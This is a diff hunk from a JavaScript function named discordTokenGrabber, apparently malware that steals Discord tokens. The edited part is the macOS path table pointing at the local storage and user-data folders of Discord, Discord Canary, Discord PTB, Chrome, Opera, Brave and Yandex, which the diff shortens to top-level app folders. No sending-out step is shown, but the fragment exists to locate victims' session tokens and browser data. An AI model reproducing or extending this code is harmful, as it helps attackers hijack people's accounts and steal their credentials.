@@ -63,65 +63,40 @@ function discordTokenGrabber() {
     }
   } else if (computerPlatform == 'darwin') {
     paths = {
-      Discord:
-        process.env.HOME + 'Library/Application Support/discord/Local Storage/leveldb' /* path.join(
-        process.env.HOME,
-        'Library',
-        'Application Support',
-        'discord',
-        'Local Storage',
-        'leveldb'
-      )*/,
+      Discord: path.join(process.env.HOME, 'Library', 'Application Support', 'discord'),
       'Discord Canary': path.join(
         process.env.HOME,
         'Library',
         'Application Support',
-        'discordcanary',
-        'Local Storage',
-        'leveldb'
+        'discordcanary'
       ),
-      'Discord PTB': path.join(
-        process.env.HOME,
-        'Library',
-        'Application Support',
-        'discordptb',
-        'Local Storage',
-        'leveldb'
-      ),
+      'Discord PTB': path.join(process.env.HOME, 'Library', 'Application Support', 'discordptb'),
       'Google Chrome': path.join(
         process.env.HOME,
         'Library',
         'Application Support',
         'Google',
-        'Chrome',
-        'User Data',
-        'Default'
+        'Chrome'
       ),
       Opera: path.join(
         process.env.HOME,
         'Library',
         'Application Support',
-        'com.operasoftware.Opera',
-        'Local Storage',
-        'leveldb'
+        'com.operasoftware.Opera'
       ),
       Brave: path.join(
         process.env.HOME,
         'Library',
         'Application Support',
         'BraveSoftware',
-        'Brave-Browser',
-        'User Data',
-        'Default'
+        'Brave-Browser'
       ),
       Yandex: path.join(
         process.env.HOME,
         'Library',
         'Application Support',
         'Yandex',
-        'YandexBrowser',
-        'User Data',
-        'Default'
+        'YandexBrowser'
       )
     }
   } else {
